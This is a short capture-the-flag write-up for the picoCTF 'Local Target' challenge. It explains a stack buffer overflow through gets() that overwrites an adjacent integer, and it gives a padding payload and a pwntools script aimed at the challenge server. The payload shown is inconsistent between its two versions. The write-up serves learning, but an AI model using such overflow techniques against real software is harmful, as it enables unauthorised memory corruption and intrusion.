# Local Target

In this challenge from [picoCTF](https://play.picoctf.org/practice/challenge/399) we need to change the value of a variable.

Looking at how the variables are assigned in the stack, we can see that `num` is set just after our `input` buffer. We also know that the input buffer is 16 bytes:

```c
char input[16];
int num = 64;
```

The goal here is to change `num` from 64 to 65.


We know that num is assigned just after our input buffer, so our stack looks like that:

```
|------------------|
|     input[15]    | <-- input[16] byte array (16 bytes)
|------------------|
|     input[14]    |
|------------------|
|     ...          |
|------------------|
|     input[0]     |
|------------------|
|     num          | <-- num (4 bytes)
|------------------|
```
We now that input is an array of 16 chars so it's size is 16 bytes. We also know that num is an integer so 4 bytes and the code uses `gets(input)` so we will need 4 more extra bytes for the padding.
So in total, we will need 24 bytes before writing on num.
Also, input is a char array, so we need to know wich char as the value of 65 in ASCII:

```py
>>> chr(65)
'A'
```

From this we can make this palyoad: 

```py
payload = '0' * 24 + 'A'
```

## Solve:

```py
from pwn import *

payload = 'A' * 24 + 'A'

p = remote('saturn.picoctf.net', 54933)
p.recv(timeout=1)
p.sendline(payload.encode())
p.interactive()
```